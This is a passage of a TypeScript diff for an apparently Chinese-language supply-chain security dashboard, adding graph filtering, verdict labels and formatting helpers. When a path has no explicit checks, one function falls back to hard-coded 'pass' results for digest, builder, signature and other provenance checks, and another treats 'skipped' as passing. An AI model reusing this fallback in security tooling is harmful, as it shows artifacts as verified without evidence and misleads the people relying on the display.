+    path.verdict === 'verified-provenance-chain' ||
+    path.category === 'verified-provenance-chain' ||
+    path.category === 'artifact-trust'
+  )
+}
+
+function isVerifiedProvenancePath(path?: KnowledgeGraphAttackPath | null) {
+  return path?.verdict === 'verified-provenance-chain'
+}
+
+function trustedProvenanceChecks(path: KnowledgeGraphAttackPath) {
+  const explicitChecks = path.checks?.filter(Boolean) ?? []
+  if (explicitChecks.length) return explicitChecks
+  return [
+    { id: 'artifact_digest_matches_subject', label: 'Digest', status: 'pass', value: '匹配', evidence: '产物 SHA256 与 attestation subject digest 匹配。' },
+    { id: 'source_repository_allowed', label: 'Repo', status: 'pass', value: '匹配', evidence: '来源仓库匹配发布策略。' },
+    { id: 'commit_matches_expected', label: 'Commit', status: 'pass', value: '匹配', evidence: 'commit/ref 由 provenance 声明并匹配策略。' },
+    { id: 'workflow_allowed', label: 'Workflow', status: 'pass', value: '允许', evidence: 'release workflow 位于允许列表。' },
+    { id: 'builder_trusted', label: 'Builder', status: 'pass', value: '可信', evidence: 'builder.id 位于企业可信 builder 列表。' },
+    { id: 'runner_environment_trusted', label: 'Runner', status: 'pass', value: 'github-hosted', evidence: 'runner 环境满足策略要求。' },
+    { id: 'provenance_predicate_type_slsa', label: 'Predicate', status: 'pass', value: 'SLSA', evidence: 'attestation 使用 SLSA provenance predicate。' },
+    { id: 'attestation_max_age', label: 'Attestation', status: 'pass', value: '新鲜', evidence: 'attestation 时间在策略窗口内。' },
+    { id: 'artifact_hash_baseline', label: 'Hash baseline', status: 'skipped', value: '未配置基线', evidence: '无历史 hash 基线时不作为阻断项。' },
+    { id: 'signature_verified', label: 'Signature', status: 'pass', value: 'gh attestation verify 通过', evidence: '签名验证命令返回通过。' },
+  ]
+}
+
+function isTrustCheckPassLike(status?: string) {
+  return status === 'pass' || status === 'skipped'
+}
+
+function trustCheckStatusLabel(status?: string) {
+  if (status === 'pass') return '通过'
+  if (status === 'skipped') return '已跳过'
+  if (status === 'warn') return '需复核'
+  if (status === 'missing') return '缺失'
+  if (status === 'fail') return '失败'
+  return status || '待确认'
+}
+
+function graphNodeFilters(
+  nodes: KnowledgeGraphNode[],
+  counts: Map<string, number>
+) {
+  const discoveredTypes = Array.from(new Set(nodes.map((node) => node.type).filter(Boolean)))
+  const orderedTypes = [
+    ...graphNodeTypeOrder.filter((type) => discoveredTypes.includes(type)),
+    ...discoveredTypes.filter((type) => !graphNodeTypeOrder.includes(type)).sort(),
+  ]
+  return [
+    { type: null, label: '全部节点', count: nodes.length },
+    ...orderedTypes.map((type) => ({
+      type,
+      label: graphNodeTypeLabel(type),
+      count: counts.get(type) ?? 0,
+    })),
+  ]
+}
+
+function countGraphNodeTypes(nodes: KnowledgeGraphNode[]) {
+  const counts = new Map<string, number>()
+  nodes.forEach((node) => counts.set(node.type, (counts.get(node.type) ?? 0) + 1))
+  return counts
+}
+
+function graphNodeTypeLabel(type: string) {
+  const labels: Record<string, string> = {
+    CodeFile: '代码文件',
+    DependencyPackage: '依赖包',
+    Vulnerability: '漏洞/公告',
+    CIStep: 'CI/CD 步骤',
+    BuildArtifact: '构建产物',
+    RuntimeService: '运行服务',
+    LogEvent: '日志事件',
+    AudioEvidence: '音频证据',
+    VisualEvidence: '视觉证据',
+    MultimodalEvidence: '多模态证据',
+    MultimodalFinding: '多模态发现',
+    RecognizedEntity: '识别实体',
+    Finding: '安全发现',
+    AttackStage: '攻击阶段',
+    SourceCommit: '源码提交',
+    Workflow: '发布工作流',
+    TrustedBuilder: '可信构建器',
+    Attestation: '可信声明',
+    EvidenceChain: '证据链',
+    Asset: '资产',
+  }
+  return labels[type] || type
+}
+
+function filterGraphNodesBySearch(nodes: KnowledgeGraphNode[], query: string) {
+  const normalizedQuery = query.trim().toLowerCase()
+  if (!normalizedQuery) return nodes
+  return nodes.filter((node) => graphNodeSearchText(node).includes(normalizedQuery))
+}
+
+function graphNodeSearchText(node: KnowledgeGraphNode) {
+  const propertyText = stringifySearchValue(node.properties)
+  return [
+    node.id,
+    node.label,
+    node.type,
+    node.risk,
+    node.description,
+    node.source,
+    node.source_model,
+    propertyText,
+  ]
+    .filter(Boolean)
+    .join(' ')
+    .toLowerCase()
+}
+
+function stringifySearchValue(value: unknown): string {
+  if (value == null) return ''
+  if (typeof value === 'string') return value
+  if (typeof value === 'number' || typeof value === 'boolean') return String(value)
+  try {
+    return JSON.stringify(value)
+  } catch {
+    return String(value)
+  }
+}
+
+function filterGraphEdgesForNodes(
+  edges: KnowledgeGraphEdge[],
+  nodes: KnowledgeGraphNode[]
+) {
+  const nodeIds = new Set(nodes.map((node) => node.id))
+  return edges.filter((edge) => nodeIds.has(edge.source) && nodeIds.has(edge.target))
+}
+
 function pathVerdictLabel(verdict?: string) {
   if (verdict === 'likely-real-attack-path') return '高度可信真实路径'
   if (verdict === 'plausible-attack-path') return '可疑真实路径'
   if (verdict === 'runtime-touched-risk') return '运行期已触达'
   if (verdict === 'plausible-runtime-touch') return '疑似运行期触达'
   if (verdict === 'provenance-risk-path') return '构建可信链风险'
+  if (verdict === 'verified-provenance-chain') return '可信证明链已验证'
   if (verdict === 'insufficient-evidence') return '证据不足'
   return '路径待判定'
 }
 
 function pathVerdictClass(verdict?: string) {
+  if (verdict === 'verified-provenance-chain') return statusClasses.active
   if (verdict === 'likely-real-attack-path' || verdict === 'runtime-touched-risk') {
     return severityClasses.critical
   }
@@ -3896,6 +5101,17 @@ function compactNumber(value: number) {
   if (value >= 1000000) return `${(value / 1000000).toFixed(1)}M`
   if (value >= 1000) return `${(value / 1000).toFixed(1)}K`
   return value.toString()
+}
+
+function formatBytes(value: number) {
+  if (value >= 1024 * 1024 * 1024) return `${(value / (1024 * 1024 * 1024)).toFixed(1)} GB`
+  if (value >= 1024 * 1024) return `${(value / (1024 * 1024)).toFixed(1)} MB`
+  if (value >= 1024) return `${(value / 1024).toFixed(1)} KB`
+  return `${value} B`
+}
+
+function formatTimestamp(value?: string | null) {
+  return String(value || '').slice(0, 19).replace('T', ' ') || '-'
 }
 
 function scannerStateLabel(state: string | undefined, available: boolean) {
